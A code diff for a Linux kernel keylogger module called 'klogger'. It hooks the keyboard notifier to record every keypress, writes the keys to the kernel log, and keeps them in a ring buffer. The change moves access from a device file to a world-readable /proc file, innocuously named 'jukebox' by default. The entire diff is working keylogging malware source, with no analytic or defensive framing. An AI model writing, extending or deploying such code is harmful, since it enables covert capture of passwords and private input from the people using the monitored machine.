@@ -2,27 +2,24 @@
 #include <linux/module.h>
 #include <linux/version.h>
 #include <linux/kernel.h>
-#include <linux/types.h>
-#include <linux/kdev_t.h>
-#include <linux/fs.h>
-#include <linux/device.h>
-#include <linux/cdev.h>
+#include <linux/proc_fs.h>
 #include <linux/keyboard.h>
 #include <asm/uaccess.h>
 #include "klogger.h"
+#include "ringBuffer.c"
 
-static dev_t first; // Global variable for the first device number 
-static struct cdev c_dev; // Global variable for the character device structure
-static struct class *cl; // Global variable for the device class
-static char c;
+#define RING_BUFFER_SIZE 1024
+
+static struct proc_dir_entry *proc_entry; /* structure that stores proc file information */
 
 /* Module's input parameters */
-static char *cdev_name = "jukebox";
+static char *proc_filename = "jukebox";
 static char *scan_code = "RAW";
-module_param(cdev_name, charp, 0000);
-MODULE_PARM_DESC(cdev_name, " Define a different name for your /dev file. By default, it is /dev/jukebox.");
+
+module_param(proc_filename, charp, 0000);
+MODULE_PARM_DESC(proc_filename, " Define a different name for your proc file. By default, it is /proc/jukebox.");
 module_param(scan_code, charp, 0000);
-MODULE_PARM_DESC(scan_code, " Select the most suitable scan code to your keyboard layout. Only RAW and SET1 (IBM PC XT) are available");  
+MODULE_PARM_DESC(scan_code, " Select the most suitable scan code to your keyboard layout. Only RAW and SET1 (IBM PC XT) are available");
 
 /** 
  * Handler responsable to read and log every key pressed by the user
@@ -30,7 +27,6 @@ MODULE_PARM_DESC(scan_code, " Select the most suitable scan code to your keyboar
  */
 int keyboard_listener(struct notifier_block *nblock, unsigned long code, void *_param) {
   struct keyboard_notifier_param *param = _param;
-  struct vc_data *vc = param->vc;
 
   if (code == KBD_KEYCODE && param->down) { // log only when user press the button, ignoring the release button action
 
@@ -45,6 +41,7 @@ int keyboard_listener(struct notifier_block *nblock, unsigned long code, void *_
 	
 	if(strcmp(scan_code,"SET1")==0) {
 		printk("%c",convertKeycode2Character(param->value,param->shift));
+		add_ring_element(convertKeycode2Character(param->value,param->shift));
 	} 
 	else {
                 printk("%i",param->value);
@@ -58,78 +55,57 @@ int keyboard_listener(struct notifier_block *nblock, unsigned long code, void *_
  * This function is called when the module is loaded
  *
  */
-int init_dev_file()
+int init_proc_file()
 {
-  if (alloc_chrdev_region(&first, 0, 1, cdev_name) < 0)
-  {
-    return -1;
-  }
-    if ((cl = class_create(THIS_MODULE, "chardrv")) == NULL)
-  {
-    unregister_chrdev_region(first, 1);
-    return -1;
-  }
-    if (device_create(cl, NULL, first, NULL, cdev_name) == NULL)
-  {
-    class_destroy(cl);
-    unregister_chrdev_region(first, 1);
-    return -1;
-  }
-    cdev_init(&c_dev, &dev_fops);
-    if (cdev_add(&c_dev, first, 1) == -1)
-  {
-    device_destroy(cl, first);
-    class_destroy(cl);
-    unregister_chrdev_region(first, 1);
-    return -1;
-  }
-  return 0;
+        proc_entry = create_proc_entry(proc_filename, 0644, NULL );
+        if(proc_entry == NULL)
+        {
+                printk(KERN_INFO "failed to create proc entry %s", proc_filename);
+                return -ENOMEM;
+        }
+        proc_entry->read_proc = read_proc_file;
+        printk(KERN_INFO "/proc/%s created\n", proc_filename);
+
+        return 0;
 }
 
 /**
  * This function is called when the module is unloaded
  *
  */
-void clear_dev_file()
+void clear_proc_file()
 {
- cdev_del(&c_dev);
- device_destroy(cl, first);
- class_destroy(cl);
- unregister_chrdev_region(first, 1);
- printk(KERN_INFO "/dev/%s removed\n", cdev_name);
+        remove_proc_entry(proc_filename,proc_entry);
+        printk(KERN_INFO "/proc/%s removed\n", proc_filename);
 }
 
 
 /**
- * This function is called then the /dev/<name> file is read
+ * This function is called then the /proc/<name> file is read
  *
  */
-ssize_t read_dev_file(struct file *f, char __user *buf, size_t len, loff_t *off)
+int read_proc_file(char *buffer,char **buffer_location,off_t offset, int buffer_length, int *eof, void *data)
 {
-    printk(KERN_INFO "Driver: read()\n");
-    if (copy_to_user(buf, &c, 1) != 0)
-        return -EFAULT;
-    else
-        return 1;
-}
+	char* ringBufferData = get_ring_elements();
+	int buffer_size = RING_BUFFER_SIZE;
+	
+        printk(KERN_INFO "procfile_read (/proc/%s) called\n", proc_filename);
 
-/**
- * This function is called with the /dev/<name> file is written
- *
- */
-ssize_t write_dev_file(struct file *f, const char __user *buf, size_t len, loff_t *off)
-{
-    printk(KERN_INFO "Driver: write()\n");
-    if (copy_from_user(&c, buf + len - 1, 1) != 0)
-        return -EFAULT;
-    else
-        return len;
-}
+        if (offset > 0) {
+                /* we have finished to read, return 0 */
+                buffer_size  = 0;
+        } else {
+                /* fill the buffer, return the buffer size */
+                memcpy(buffer, ringBufferData,buffer_size);
+        }
 
+        return buffer_size;
+}
 
 static int __init klogger_init(void)
 {
-  init_dev_file();
+  init_proc_file();
+  initialize_ring_buffer(RING_BUFFER_SIZE);
   register_keyboard_notifier(&nb);
   printk(KERN_INFO "klogger registered and listening\n");
 
@@ -138,11 +114,10 @@ static int __init klogger_init(void)
 
 static void __exit klogger_exit(void)
 {
-  clear_dev_file();
+  clear_proc_file();
   unregister_keyboard_notifier(&nb);
   printk(KERN_INFO "klogger unregistered\n");
 }
-
 
 module_init(klogger_init);
 module_exit(klogger_exit);
